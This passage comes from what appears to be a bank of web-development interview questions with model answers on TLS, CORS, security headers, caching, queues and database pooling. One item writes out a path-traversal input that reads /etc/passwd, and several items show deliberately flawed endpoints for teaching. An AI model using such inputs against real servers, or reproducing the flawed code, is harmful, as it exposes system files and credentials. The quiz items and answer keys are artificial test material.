    solution: "Correct: b. Under HTTP/1.1, a connection processes requests one after another — a slow response blocks everything queued behind it on that connection. Browsers compensated by opening ~6 parallel TCP connections per host, and web developers built an entire folklore of workarounds: sprite sheets (bundle 50 icons into one image), file concatenation, domain sharding (serve assets from asset1.example.com and asset2... to get more connections). HTTP/2 made those obsolete with **multiplexing**: one TCP connection carries many interleaved request/response streams simultaneously — no queuing behind a slow resource, plus **header compression** (HPACK; cookie-laden headers stopped being resent in full each request) and stream prioritization. It's a binary protocol rather than text, though semantics (methods, status codes, headers) stayed identical — your application code doesn't change; the server/CDN config enables it.\n\nThe sequel worth one sentence: HTTP/2 still rode TCP, where one *lost packet* stalls all multiplexed streams (TCP-level head-of-line blocking); **HTTP/3** switches transport to QUIC over UDP, giving each stream independent delivery plus faster connection setup — most major sites and CDNs serve it today.\n\nWhy the others are wrong: a — HTTP/1.x carried binaries fine; c — HTTPS works over every HTTP version (browsers actually *require* TLS for HTTP/2); d — no such size limit existed.\n\nInterview soundbite: 'HTTP/1.1 = one lane per connection; HTTP/2 = many lanes, one connection; HTTP/3 = same lanes, better road.'"
  },
  {
    id: "intw-027",
    category: "interview",
    difficulty: "advanced",
    type: "open",
    question: "Mechanically, what happens during the TLS handshake when a browser connects to https://example.com? What role do certificates and certificate authorities play?",
    code: null,
    options: null,
    answer: null,
    solution: "Goal of the handshake: agree on encryption keys with a server you've never met, while *proving* the server is really example.com. The flow (TLS 1.3 shape): the browser sends a **ClientHello** — supported cipher suites plus its half of a key exchange; the server replies with its choice, its own key-exchange half, and its **certificate**. Both sides now independently derive the same **session keys** via (elliptic-curve) Diffie–Hellman — the elegant trick where two parties compute a shared secret over an open channel that an eavesdropper watching every byte still cannot reconstruct. Once both have the session key, traffic switches to fast **symmetric encryption** (AES) — asymmetric crypto is used only to bootstrap. The **certificate** is what stops an impostor: it binds the domain to a public key and is **signed by a Certificate Authority** the browser already trusts (root CAs ship with the OS/browser). The browser checks the chain up to a trusted root, that the domain matches, that it hasn't expired or been revoked — so an attacker can't just present their own key for example.com, because no CA will sign a cert for a domain they don't control. What it guarantees: confidentiality (eavesdroppers see ciphertext), integrity (tampering is detected), and server authenticity. What it does NOT guarantee: that the site is honest — a phishing site can hold a perfectly valid certificate, so the padlock means 'encrypted to *this* server', not 'trustworthy'. The ephemeral (per-session) Diffie–Hellman also gives **forward secrecy**: stealing the server's long-term key later can't decrypt traffic recorded today. Interview tip: 'asymmetric crypto authenticates the server and bootstraps a shared key, then symmetric crypto does the bulk work; the certificate is a CA's signed vouching for the server's identity' is the level expected — naming forward secrecy is bonus depth."
  },
  {
    id: "intw-028",
    category: "interview",
    difficulty: "medium",
    type: "code",
    question: "This endpoint returns the right HTML but a security scanner flags it as missing critical response headers. Which headers should it set, and what does each prevent?",
    code: "app.get(\"/dashboard\", requireAuth, (req, res) => {\n  res.send(renderDashboard(req.user));   // returns HTML\n});\n\n// No security headers are set anywhere in the app.",
    options: null,
    answer: null,
    solution: "The response is functionally correct but ships none of the browser-protection headers a modern app needs. The high-value ones:\n- **`Content-Security-Policy`** — the single most impactful. It declares which sources of scripts/styles/etc. are allowed, so even if an attacker injects `<script>`, the browser refuses to run it unless it matches the policy. A strict CSP (`script-src 'self'`) is the strongest defense-in-depth against XSS. (Hardest to configure, most worth it.)\n- **`Strict-Transport-Security` (HSTS)** — `max-age=31536000; includeSubDomains`: forces HTTPS for this domain for a year, defeating SSL-stripping downgrade attacks.\n- **`X-Content-Type-Options: nosniff`** — stops the browser MIME-sniffing a response into a different type than declared (a vector for executing a file as script).\n- **`X-Frame-Options: DENY`** (or CSP's `frame-ancestors`) — prevents your page being embedded in an iframe on a malicious site (clickjacking).\n- **`Referrer-Policy`** and a sensible **`Permissions-Policy`** round it out.\n\nThe practical fix isn't setting these per route — use a middleware like **helmet** (`app.use(helmet())`) that sets sensible defaults app-wide, then tune the CSP. The principle: HTTP **response headers are a security surface**, configured once globally; correct data with missing headers still fails a security review, because the browser is a powerful enforcement point you're declining to use. (Cookies have their own header-level hardening — `Secure`, `HttpOnly`, `SameSite` — a related checklist.)"
  },
  {
    id: "intw-029",
    category: "interview",
    difficulty: "medium",
    type: "mcq",
    question: "A request fails with a CORS error in the browser console, but a colleague insists 'CORS isn't a security feature, the data already left the server.' What's the most accurate framing?",
    code: null,
    options: {
      a: "CORS protects your server from receiving malicious requests",
      b: "CORS is a browser-enforced relaxation of the same-origin policy: by default the browser blocks JavaScript on origin A from *reading* responses from origin B; CORS headers from B opt specific origins back in. It protects users (their browser/credentials), not your server — and non-browser clients ignore it entirely",
      c: "CORS encrypts cross-origin requests so they can't be intercepted",
      d: "Adding `Access-Control-Allow-Origin: *` is always the correct fix"
    },
    answer: "b",
    solution: "Correct: b. The foundation is the **same-origin policy**: a browser rule that by default forbids JavaScript on `https://a.com` from *reading* responses fetched from `https://b.com` (different origin = scheme + host + port). This stops a malicious site you visit from quietly using *your logged-in cookies* to read your bank's API. **CORS** is the controlled opt-out: server B sends headers (`Access-Control-Allow-Origin: https://a.com`, plus `Access-Control-Allow-Credentials: true` for credentialed requests) telling the browser 'this origin may read my responses.' Crucial subtleties: (1) the browser enforces it *on the response* — the request often *does* reach the server and may have side effects; CORS just blocks the page's JS from *reading the reply*. (2) That's why it 'works in Postman/curl' — non-browser clients have no same-origin policy to enforce. (3) For some requests the browser first sends a **preflight** `OPTIONS` to ask permission. The colleague is half right — CORS doesn't protect your *server* from receiving requests (that's auth, validation, and CSRF defenses) — but wrong that it's pointless: it protects *users* by keeping other sites from reading their authenticated responses.\n\nWhy the others are wrong: a — inverts who's protected; c — encryption is TLS; d — `*` disables the protection wholesale and is forbidden with credentials; allow the *specific* origin(s) you intend."
  },
  {
    id: "intw-030",
    category: "interview",
    difficulty: "advanced",
    type: "open",
    question: "Compare REST and gRPC for service-to-service communication. When would you reach for gRPC over a JSON/HTTP API?",
    code: null,
    options: null,
    answer: null,
    solution: "REST (JSON over HTTP/1.1, typically) and gRPC (Protocol Buffers over HTTP/2) solve the same problem — calling another service — with different trade-offs. **gRPC's advantages**: messages are **Protobuf**, a compact binary format defined by a *schema* (`.proto` file) — far smaller and faster to serialize than JSON, and the schema generates strongly-typed client/server stubs in many languages, so the contract is enforced at compile time rather than discovered at runtime. It rides **HTTP/2**, getting multiplexing and first-class **streaming** (client-, server-, and bidirectional), which REST handles awkwardly. Excellent for **high-throughput internal microservice-to-microservice** traffic where milliseconds and bytes count. **gRPC's costs**: not human-readable (can't curl it or eyeball a payload), limited browser support (needs a proxy like gRPC-Web), heavier tooling/debugging, and a schema-compile step. **REST's advantages** are the mirror image: human-readable, debuggable with browser/curl/Postman, universally supported, cacheable via standard HTTP semantics, zero special tooling — which is why it dominates **public-facing APIs**. The decision rule: internal, performance-sensitive, polyglot services needing streaming or strict contracts → gRPC; public APIs, browser clients, broad reach, or 'just needs to work and be debuggable' → REST. GraphQL is a third option for client-driven flexible queries. Many real systems use both — gRPC behind the wall, REST/GraphQL at the edge. Interview tip: 'binary + schema + HTTP/2 streaming for internal speed; JSON + universal + debuggable for public reach' captures the contrast, and 'gRPC between services, REST at the edge' shows you've seen the common hybrid."
  },
  {
    id: "intw-031",
    category: "interview",
    difficulty: "advanced",
    type: "mcq",
    question: "Your single API server handles 500 req/s fine, but at 5,000 req/s it falls over. You add 4 more identical servers behind a load balancer and throughput barely improves. What is the most likely bottleneck?",
    code: null,
    options: {
      a: "The load balancer can only route to one server at a time",
      b: "A shared downstream dependency — most often the single database — is the real ceiling; adding stateless app servers just moves the queue to the resource they all contend for",
      c: "HTTP cannot handle more than 1,000 requests per second by protocol",
      d: "You must rewrite the app in a faster language before scaling helps"
    },
    answer: "b",
    solution: "Correct: b. Horizontal scaling of *stateless* app servers only helps if the app server is the bottleneck. Often it isn't — five app servers all reading and writing the **same database** just send five times the load to that one database, which becomes the wall. You scaled the cheap, easy tier and left the hard, shared tier untouched. The central lesson: **find the actual bottleneck before adding capacity** (measure — CPU? DB connections maxed? disk I/O? a lock?), because adding servers upstream of a saturated shared resource just lengthens its queue.\n\nThe fixes target the real ceiling, roughly by effort: **caching** (Redis in front of hot reads — usually the highest-leverage first move), **read replicas** (spread reads across copies; powerful because most apps read far more than they write), **connection pooling** (often the app is exhausting DB connections, not the DB's CPU), **query/index optimization** (one N+1 or unindexed query can be the whole problem), and only later **sharding** the database or moving specific workloads to a different store. Anything that can be made stateless and cached (sessions in Redis, static assets on a CDN) takes load off the core.\n\nWhy the others are wrong: a — load balancers distribute across all backends concurrently; c — HTTP has no such limit; d — language can matter, but 'adding servers doesn't help' points squarely at a shared downstream resource, not app-tier CPU."
  },
  {
    id: "intw-032",
    category: "interview",
    difficulty: "medium",
    type: "code",
    question: "This login endpoint 'works' but a security reviewer rejects it on two counts related to how it handles passwords and failed logins. Identify both.",
    code: "app.post(\"/login\", async (req, res) => {\n  const { email, password } = req.body;\n  const user = await db.getUserByEmail(email);\n\n  if (!user) {\n    return res.status(404).send(\"No account with that email\");\n  }\n  if (user.password !== password) {\n    return res.status(401).send(\"Incorrect password\");\n  }\n  res.json({ token: createSession(user) });\n});",
    options: null,
    answer: null,
    solution: "Two serious flaws:\n\n**1. Passwords stored and compared in plaintext.** `user.password !== password` only works if the database holds the raw password — so a database breach hands attackers every user's actual password (and, via reuse, their other accounts). Passwords must be stored as a **salted hash** using a slow, purpose-built algorithm — **bcrypt, scrypt, or Argon2** — never plaintext, never a fast hash like MD5/SHA-256 (fast hashes are brute-forced at billions/sec). The check becomes `await bcrypt.compare(password, user.passwordHash)`. The 'slow' is the feature: it makes mass cracking expensive, and the per-user salt defeats precomputed rainbow tables.\n\n**2. User enumeration via different responses.** '404 No account with that email' vs '401 Incorrect password' tells an attacker *which emails are registered* — they can probe to harvest valid accounts for targeted phishing and credential stuffing. The fix: return the **same generic message and status** for both — 'Invalid email or password.' Rigorous implementations also equalize *timing* (run the bcrypt compare even when the user doesn't exist, against a dummy hash) so response time doesn't leak existence.\n\nWhile here, the production checklist this endpoint also wants: **rate limiting / lockout** on repeated failures (brute-force defense), HTTPS-only, and the session cookie hardened (`HttpOnly`, `Secure`, `SameSite`). Interview framing: the two headline answers are 'hash with bcrypt/Argon2, never plaintext' and 'identical response for unknown-email and wrong-password to prevent enumeration'; naming both plus rate limiting is a strong security answer."
  },
  {
    id: "intw-033",
    category: "interview",
    difficulty: "advanced",
    type: "open",
    question: "What is a message queue (like RabbitMQ, SQS, or Kafka), and what problems does putting one between your services solve? What new problems does it introduce?",
    code: null,
    options: null,
    answer: null,
    solution: "A message queue sits between a **producer** (publishes a message — 'order 123 placed') and one or more **consumers** (process it later), decoupling them in time. Instead of service A calling service B synchronously and waiting, A drops a message on the queue and moves on; B pulls and processes when ready. Problems it solves: **(1) Decoupling** — A needn't know who consumes, how many consumers exist, or whether they're up; add a new consumer without touching A. **(2) Load leveling** — a traffic spike fills the queue rather than crushing B; B drains at its sustainable rate. **(3) Async work** — the slow welcome-email or PDF generation gets queued so the user's request returns immediately (the fix for the '6-second signup'). **(4) Resilience** — if B is down, messages wait instead of being lost. **(5) Work distribution** — multiple consumer instances pull from one queue for easy horizontal scaling. The new problems — the honest half: **eventual consistency** (work happens *later*, so the UI must not imply it's done — 'your export is being prepared'); **at-least-once delivery** means messages can arrive **twice** (network retries), so consumers must be **idempotent** (processing twice = same result, usually via a dedupe key); **ordering** isn't guaranteed by default (Kafka gives per-partition order, many queues give none); **failure handling** needs a **dead-letter queue** for messages that keep failing, plus monitoring of **queue depth** (a growing backlog means consumers can't keep up); and you've added **operational complexity** — another system to run and reason about. The decision: queues shine for async, spiky, or fan-out workloads where 'eventually' is acceptable; wrong when the caller genuinely needs the result *now*. Interview tip: 'decouple in time, absorb spikes, survive consumer downtime — at the cost of eventual consistency and a hard requirement that consumers be idempotent' is the complete shape; naming idempotency and dead-letter queues signals you've operated one."
  },
  {
    id: "intw-034",
    category: "interview",
    difficulty: "medium",
    type: "mcq",
    question: "A user reports your single-page app shows a blank page when they refresh on `https://app.com/reports/42`, even though clicking to that page from the home screen works fine. What's the likely cause?",
    code: null,
    options: {
      a: "The browser cache is corrupted; tell users to clear it",
      b: "Client-side routing: in-app navigation is handled by JavaScript without hitting the server, but a refresh sends a real GET to `/reports/42`, which the server has no route for — it must be configured to serve index.html for unknown paths (or use hash routing / server-side rendering)",
      c: "React/Vue cannot support URLs with numbers in them",
      d: "The user's internet connection dropped only on refresh"
    },
    answer: "b",
    solution: "Correct: b. In a single-page app, the router intercepts in-app navigation and swaps components *client-side* — the URL bar updates via the History API, but **no request goes to the server**. That's why clicking to `/reports/42` works: it's pure JavaScript. A **refresh (or a pasted/bookmarked link)** is different — the browser makes a real `GET /reports/42`. The server's filesystem has no `/reports/42` file and no such route, so it returns 404 or a blank page, and the app's JavaScript — which *contains* the router that knows what `/reports/42` means — never loads.\n\nThe standard fixes: **(1) Catch-all rewrite** — configure the server/host to serve `index.html` for any unmatched path (nginx `try_files $uri /index.html`, Netlify/Vercel rewrite rules, Express `app.get('*', ...)`). Every URL loads the app, and the client router renders the right view. The usual answer. **(2) Hash routing** — URLs like `/#/reports/42`; everything after `#` is never sent to the server, so refresh always loads the root — simpler but uglier URLs and weaker SEO. **(3) Server-side rendering / a meta-framework** (Next.js, Nuxt) — the server renders each route, also fixing SEO and first paint.\n\nWhy the others are wrong: a — cache isn't involved; the fingerprint (works on click, fails on refresh) is exactly SPA routing; c — dynamic segments are normal; d — connectivity wouldn't selectively fail only on refresh of one route."
  },
  {
    id: "intw-035",
    category: "interview",
    difficulty: "medium",
    type: "open",
    question: "Explain the critical rendering path: what does the browser actually do between receiving HTML and showing pixels, and what are the highest-impact things a developer can do to make the page appear faster?",
    code: null,
    options: null,
    answer: null,
    solution: "The browser turns bytes into pixels through a pipeline: parse HTML into the **DOM**; parse CSS into the **CSSOM**; combine them into the **render tree** (visible nodes with computed styles); **layout** (reflow — compute every box's geometry); **paint** (fill pixels); and **composite** (assemble layers onto the screen). Two big blockers: **CSS is render-blocking** — the browser won't paint until it has the CSSOM, because it can't draw without styles; and **synchronous `<script>` is parser-blocking** — a plain script stops HTML parsing until it downloads and runs. So the highest-impact levers map onto the pipeline: **(1) Don't let JS block parsing** — use `defer` (or `type=\"module\"`) so scripts download in parallel and run after parsing; reserve `async` for independent scripts like analytics. **(2) Minimize render-blocking CSS** — inline the small amount of *critical* (above-the-fold) CSS so first paint needs no CSS round-trip, load the rest non-blockingly. **(3) Prioritize critical-path resources** — `preconnect` to third-party origins, `preload` late-discovered essentials like fonts, `fetchpriority=\"high\"` on the LCP hero image; lazy-load (`loading=\"lazy\"`) below-the-fold images off the critical path. **(4) Prevent layout thrash and shift** — set explicit image `width`/`height` (or `aspect-ratio`) to avoid content jumping (CLS), and animate only `transform`/`opacity` (compositor-only, skipping layout/paint) rather than `top`/`width` (reflow every frame). **(5) Ship less** — smaller compressed assets from a CDN to cut round-trip latency. The framing that ties it together: these map onto **Core Web Vitals** — LCP, CLS, and interaction responsiveness. Interview tip: 'CSS blocks rendering, sync JS blocks parsing' is the sentence to anchor on, then hang the fixes — defer scripts, inline critical CSS, size your images — off it."
  },
  {
    id: "intw-036",
    category: "interview",
    difficulty: "medium",
    type: "code",
    question: "This search box fires an API request on every keystroke, hammering the server. Fill in the two blanks to debounce it so the request only fires 300ms after the user stops typing.",
    code: "function debounce(fn, delay) {\n  let timer;\n  return function (...args) {\n    clearTimeout(____);\n    timer = setTimeout(() => fn.apply(this, args), ____);\n  };\n}\n\nconst search = debounce((q) => {\n  fetch(`/api/search?q=${encodeURIComponent(q)}`).then(render);\n}, 300);\n\ninput.addEventListener(\"input\", (e) => search(e.target.value));",
    options: null,
    answer: null,
    solution: "The blanks are `timer` and `delay`:\n\nfunction debounce(fn, delay) {\n  let timer;\n  return function (...args) {\n    clearTimeout(timer);\n    timer = setTimeout(() => fn.apply(this, args), delay);\n  };\n}\n\nHow it works: each call **cancels the previously scheduled call** (`clearTimeout(timer)`) and schedules a new one `delay` ms out. As long as keystrokes keep arriving inside the window, the timer keeps resetting and the function never runs — it fires once the user pauses for 300ms. `timer` persists across calls because it lives in the **closure** the returned function captures (the canonical practical-closure example). The wrapper is a regular `function`, not an arrow, so `fn.apply(this, args)` forwards the original `this` and arguments.\n\nWhy this matters here specifically — it's not just load: debouncing a search box also **fixes a race condition**. Firing on every keystroke means responses can arrive *out of order* (the response for 'ca' lands after 'cat' and overwrites it with stale results); waiting until typing stops means one request per intended query. For belt-and-suspenders, pair it with `AbortController` to cancel any still-in-flight request.\n\nDebounce vs throttle, the distinction interviewers probe: **debounce** = 'run once after activity stops' — search-as-you-type, resize-end, autosave; **throttle** = 'run at most once per interval *during* activity' — scroll position, mousemove. Same goal (tame a flood of events), opposite timing. Production note: libraries add leading/trailing options and a `cancel()` method, but this six-line version is what you'd write on a whiteboard."
  },
  {
    id: "intw-037",
    category: "interview",
    difficulty: "advanced",
    type: "mcq",
    question: "Your service caches an expensive 'top friends' computation in Redis. Which scenario describes a 'cache stampede' (thundering herd), and what mitigates it?",
    code: null,
    options: {
      a: "The cache server runs out of memory and evicts everything at once",
      b: "A popular cached key expires, and in the brief window before it's recomputed, thousands of concurrent requests all miss the cache and hit the expensive computation/database simultaneously — mitigated by locking so only one request recomputes while others wait or serve stale, plus jittered TTLs",
      c: "Two users request different keys at the same time",
      d: "The cache returns stale data forever because TTLs are too long"
    },
    answer: "b",
    solution: "Correct: b. A cache stampede happens at the moment a **hot key expires**. Normally the cache absorbs nearly all traffic for that key; the instant it expires, every concurrent request for it misses *at once* and they all fall through to the expensive operation simultaneously — a thundering herd that can spike the database to its knees precisely *because* the key was popular. The cruel irony: the more effective the cache was, the bigger the herd when it lapses.\n\nThe mitigations, worth knowing as a set: **(1) Locking / request coalescing** — when the key is missing, only the *first* request acquires a lock and recomputes; others wait for it or briefly serve stale. The primary fix. **(2) Stale-while-revalidate** — serve the slightly-stale value to everyone while a single background job refreshes it. **(3) Jittered TTLs** — add randomness to expiry so many keys (or copies of one) don't expire in lockstep. **(4) Proactive refresh** — recompute hot keys before they expire. **(5) Early/probabilistic expiration** — a request 'volunteers' to refresh slightly before the real TTL.\n\nWhy the others are wrong: a — that's cache eviction/memory pressure (the related 'cache avalanche' when mass-eviction causes a similar herd); c — different keys is normal operation; d — that's a staleness/invalidation bug, the opposite problem. Interview tip: 'hot key expires → simultaneous misses → herd hits the DB; fix with a recompute lock plus TTL jitter.'"
  },
  {
    id: "intw-038",
    category: "interview",
    difficulty: "medium",
    type: "open",
    question: "What is a reverse proxy (e.g. nginx in front of your app servers), and what jobs does it typically do? How is it different from a forward proxy?",
    code: null,
    options: null,
    answer: null,
    solution: "A **reverse proxy** sits in front of your servers and receives client requests on their behalf, then forwards them to the appropriate backend — the client thinks it's talking to one server, but there's a dispatcher in between. (The contrast: a **forward proxy** sits in front of *clients* and forwards their outbound requests to the internet — a corporate filter or a VPN. Forward proxy = front for clients going out; reverse proxy = front for servers receiving in.) The jobs a reverse proxy absorbs, which is why nearly every production system has one: **(1) Load balancing** — distribute requests across identical app servers, with health checks to skip dead instances. **(2) TLS termination** — handle HTTPS at the edge so app servers deal in plain HTTP internally (one place for certificates, less app CPU). **(3) Caching and compression** — serve cached responses and gzip/brotli without bothering the backend. **(4) Static file serving** — hand back images/CSS/JS far more efficiently than the app server. **(5) Routing by path or host** — `/api` to API servers, `/` to the frontend; `app.com` vs `admin.app.com` to different services. **(6) A security/ops chokepoint** — rate limiting, IP allow/deny, request size limits, hiding backend topology (clients never learn how many servers exist), single-point access logging. **(7) Buffering slow clients** so a trickling connection doesn't tie up an app worker. The architectural value: it centralizes cross-cutting concerns at one tier so app servers stay simple and stateless — which is what makes horizontal scaling clean. Examples: nginx, HAProxy, Envoy, managed cloud load balancers; CDNs are essentially globally-distributed reverse proxies. Interview tip: 'a single front door for many backend servers handling load balancing, TLS, caching, and routing' nails the core, and 'front for clients vs front for servers' captures forward-vs-reverse."
  },
  {
    id: "intw-039",
    category: "interview",
    difficulty: "medium",
    type: "open",
    question: "What does HTTP compression (gzip/brotli) do, how is it negotiated between client and server, and what should and shouldn't you compress?",
    code: null,
    options: null,
    answer: null,
    solution: "HTTP compression shrinks the response body before sending it over the network, trading a little CPU for far less bandwidth and faster transfers — text assets often compress 70–90%, which directly improves load time, especially on slow or mobile connections. The negotiation is a clean example of HTTP content negotiation: the client advertises what it supports with the **`Accept-Encoding: gzip, br`** request header; the server picks one it can do, compresses the body, and signals its choice with the **`Content-Encoding: br`** response header; the browser transparently decompresses before the page ever sees it. **gzip** is the universal baseline; **brotli (br)** compresses text noticeably better and is now broadly supported (often used for static assets, with gzip as fallback). What to compress: text-based resources — HTML, CSS, JavaScript, JSON API responses, SVG — where the ratios are huge. What NOT to compress: already-compressed binary formats — JPEG/PNG/WebP images, MP4 video, zip files, fonts in WOFF2 — because they're near incompressible, so you'd burn CPU for ~0% gain (occasionally even growing the file slightly). The practical realities: compression is usually configured once at the **reverse proxy / CDN / web server** (nginx `gzip on`, CloudFront/Cloudflare auto-compress) rather than per-response in app code; static assets are often **pre-compressed at build time** (ship `app.js.br` alongside `app.js`) so the server serves a precomputed file instead of compressing on every request; and there's a security note — mixing compression with secrets in the same response enabled attacks like BREACH, so don't compress responses that reflect user input alongside sensitive tokens. Interview tip: '`Accept-Encoding` from the client, `Content-Encoding` from the server, compress text not media, and configure it at the edge' is the complete answer; knowing brotli-beats-gzip-on-text and 'don't compress JPEGs' shows real familiarity."
  },
  {
    id: "intw-040",
    category: "interview",
    difficulty: "basic",
    type: "mcq",
    question: "Which HTTP status code is correct when a request is well-formed and authenticated, but the server cannot find the requested resource?",
    code: null,
    options: {
      a: "400 Bad Request",
      b: "403 Forbidden",
      c: "404 Not Found",
      d: "500 Internal Server Error"
    },
    answer: "c",
    solution: "Correct: c. **404 Not Found** means the server understood the request fine but has no resource at that URL — `GET /users/9999` where user 9999 doesn't exist. Nothing is wrong with the *request*; the thing just isn't there.\n\nWhy the others are wrong, and the distinctions that matter:\n- **400 Bad Request** — the request itself is malformed: invalid JSON, missing required fields, wrong parameter type. The *client* sent something unparseable. (404 = couldn't find it; 400 = couldn't understand it.)\n- **403 Forbidden** — understood, knows who you are, but you're *not allowed* (authorization failure). Contrast **401 Unauthorized**: 'you're not authenticated — log in first.' 401 = who are you, 403 = I know who you are and no.\n- **500 Internal Server Error** — *the server* broke (unhandled exception, crashed dependency). The one that's *your* fault, and the one monitoring should alert on.\n\nThe mental model: **2xx** success, **3xx** redirection, **4xx** the *client* erred, **5xx** the *server* erred. Picking the right code isn't pedantry — clients, caches, CDNs, monitoring, and retry logic all branch on it: a 404 shouldn't be retried, a 500 might be, a 429 means back off. A subtle security choice worth mentioning: APIs sometimes return **404 instead of 403** for resources a user can't see, so the response doesn't even confirm the resource *exists*."
  },
  {
    id: "intw-041",
    category: "interview",
    difficulty: "advanced",
    type: "open",
    question: "Your app needs to push live updates to a fleet of users and let them send messages back, in real time, at scale. Walk me through the realtime transport options and the operational realities of running WebSockets in production.",
    code: null,
    options: null,
    answer: null,
    solution: "Match transport to need. **Short polling** (ask 'anything new?' on a timer) — trivial, works everywhere, but wasteful and laggy; fine for low-frequency updates. **Long polling** (server holds the request open until there's data, then the client re-asks) — near-real-time over plain HTTP, a solid fallback, but ties up a connection per client. **Server-Sent Events (SSE)** — a one-way server→client stream over a single long-lived HTTP connection with built-in auto-reconnect; perfect when updates flow *one way* (notifications, live scores, streaming LLM tokens) and the client talks back over ordinary requests. **WebSockets** — a full **bidirectional**, persistent connection after an HTTP upgrade; the right tool when you need *both* directions with low latency: chat, collaborative editing, multiplayer. Since this prompt needs both directions in real time, WebSockets (or SSE-down + POST-up if the back-channel is light) fits. The operational realities — what separates 'read about it' from 'run it': **(1) State breaks horizontal scaling** — each socket is a long-lived connection pinned to one server, so a user's message must reach whichever server *other* users are on; you need a **pub/sub backplane** (Redis pub/sub, a broker) so servers broadcast to each other, plus sticky sessions or a connection-aware load balancer. **(2) Connection count is the scaling axis**, not requests/sec — each idle socket costs memory and a file descriptor. **(3) Reconnection and missed messages** — networks drop sockets constantly (mobile, sleep, proxies); clients need reconnect-with-backoff, and you need a story for messages sent while disconnected (sequence numbers + replay). **(4) Auth** — authenticate at connect and handle token expiry mid-connection. **(5) Infrastructure friction** — some proxies/load balancers need explicit config for upgrades and long idle timeouts; heartbeats/pings keep connections alive and detect dead ones. Many teams use a library (Socket.IO) or a managed service (Pusher, Ably) to outsource reconnection, fallback, and the backplane. Interview tip: pick by directionality and latency, then volunteer 'sockets are stateful, so I need a Redis pub/sub backplane and a reconnect strategy' — that sentence shows production awareness."
  },
  {
    id: "intw-042",
    category: "interview",
    difficulty: "medium",
    type: "mcq",
    question: "A browser sends `Accept: application/json` and your endpoint returns HTML anyway. What HTTP mechanism is this header part of, and what should a well-behaved server do?",
    code: null,
    options: {
      a: "It's a security header; the server should ignore it",
      b: "Content negotiation: the client states preferred response formats via `Accept`, and the server should return that format (setting `Content-Type` accordingly) or respond `406 Not Acceptable` if it can't — rather than silently sending an unrequested format",
      c: "It sets the request body's encoding, unrelated to the response",
      d: "It forces the server to compress the response"
    },
    answer: "b",
    solution: "Correct: b. The **`Accept`** request header is the heart of HTTP **content negotiation**: the client lists the media types it can handle, optionally weighted (`Accept: application/json, text/html;q=0.9`), and the server is expected to honor the preference — return JSON, set **`Content-Type: application/json`** on the response, and if it genuinely cannot produce any acceptable format, return **406 Not Acceptable** rather than silently sending something the client didn't ask for. Returning HTML to a client that asked for JSON is exactly the kind of bug that breaks API consumers (their JSON parser chokes on `<html>`). The `Accept` family covers several axes: `Accept-Language` (negotiate locale — the i18n hook), `Accept-Encoding` (negotiate gzip/brotli compression), and the matching response headers `Content-Type`, `Content-Language`, `Content-Encoding`. Many frameworks expose this directly — Express's `res.format({ json: ..., html: ... })` branches on `Accept`.\n\nWhy the others are wrong: a — it's not a security header and shouldn't be ignored; honoring it is correct behavior; c — that's `Content-Type` on the *request* (describing the body you're sending); `Accept` describes the *response* you want; d — compression negotiation is `Accept-Encoding`, a sibling header, not `Accept`.\n\nThe distinction interviewers probe: **`Content-Type` describes the body in *this* message; `Accept` describes the body you want *back*.** A POST has a `Content-Type` (what you're sending) and may carry an `Accept` (what format you want in reply) at the same time."
  },
  {
    id: "intw-043",
    category: "interview",
    difficulty: "medium",
    type: "code",
    question: "A reviewer says this download endpoint lets an attacker read arbitrary files off the server. What's the vulnerability and the fix?",
    code: "app.get(\"/download\", (req, res) => {\n  const fileName = req.query.name;\n  const filePath = \"/var/app/uploads/\" + fileName;\n  res.sendFile(filePath);\n});",
    options: null,
    answer: null,
    solution: "The vulnerability is **path traversal** (directory traversal). `fileName` is attacker-controlled and concatenated straight into a filesystem path. A request like `/download?name=../../../../etc/passwd` resolves to `/var/app/uploads/../../../../etc/passwd` → `/etc/passwd`, letting the attacker climb out of the uploads directory and read *any file the server process can access* — config files with secrets, `.env`, SSH keys, other users' uploads. (URL-encoded variants like `%2e%2e%2f` dodge naive filters, which is why blacklisting `..` is not a real fix.)\n\nThe robust fix — **resolve the path and verify it's still inside the intended directory:**\n\nconst path = require(\"path\");\nconst UPLOAD_DIR = path.resolve(\"/var/app/uploads\");\n\napp.get(\"/download\", (req, res) => {\n  const requested = path.resolve(UPLOAD_DIR, req.query.name);\n  if (!requested.startsWith(UPLOAD_DIR + path.sep)) {\n    return res.status(400).send(\"Invalid file name\");\n  }\n  res.sendFile(requested);\n});\n\nThe principle: don't filter the bad input — **resolve the final path and confirm it lands where you expect** (let the OS normalize `..`, then check containment). Defense in depth on top: prefer to never expose raw filenames — store uploads under opaque IDs and look the real path up from a database (`/download?id=abc123`), removing user-controlled path components entirely; use `path.basename()` to strip directory parts if you must accept a name; and run the process with least privilege so even a traversal can't reach sensitive files. This is the filesystem cousin of SQL injection — same lesson: **never build a sensitive identifier (a path, a query) by concatenating untrusted input.**"
  },
  {
    id: "intw-044",
    category: "interview",
    difficulty: "advanced",
    type: "open",
    question: "What is database connection pooling, and why does opening a fresh connection per request fall apart under load? What pool settings actually matter?",
    code: null,
    options: null,
    answer: null,
    solution: "Opening a database connection is expensive: a TCP handshake, often a TLS handshake, then database-side authentication and session setup — tens of milliseconds, and real resources on the DB server (Postgres famously spawns a backend process per connection). Do that *per HTTP request* and two things break under load: per-request latency is dominated by connection setup rather than the query, and — the killer — a spike opens hundreds or thousands of simultaneous connections, blowing past the database's connection limit (Postgres defaults to ~100) and exhausting its memory; the DB starts refusing connections or thrashing, and the whole app falls over. A **connection pool** maintains a fixed set of pre-opened, reusable connections: a request **borrows** one, runs its query, and **returns** it instead of closing it. Setup cost is paid once at startup; requests skip the handshake; and crucially the pool **caps concurrency** — if all connections are busy, new requests *wait in a queue* rather than piling unbounded load onto the database. That queueing is a feature: it converts 'crash the DB' into 'requests get a little slower' — backpressure that protects the database. Settings that matter: **pool size** (max connections) — the most important, and counterintuitively *small* is often right: it must respect the DB's limit *divided across all app instances* (10 app servers × a 20-connection pool = 200 connections at the DB — easy to overshoot), and beyond the DB's parallelism more connections add contention, not throughput; **acquire timeout** (how long a request waits for a free connection before failing — fail fast rather than hang); **idle timeout** (close unused connections to free resources); **max lifetime** (recycle periodically to avoid stale server-side state); and **validation** (check a connection is alive before handing it out). The classic bug to mention: **connection leaks** — code that borrows but forgets to return (missing `finally`/release on an error path) slowly drains the pool until every request hangs. At large scale, an external pooler like **PgBouncer** multiplexes many app instances onto fewer DB connections. Interview tip: 'reuse expensive connections *and* cap concurrency to protect the DB' is the two-part why; 'pool size must account for all app instances against the DB's limit' shows you've tuned one."
  },
  {
    id: "intw-045",
    category: "interview",
    difficulty: "basic",
    type: "mcq",
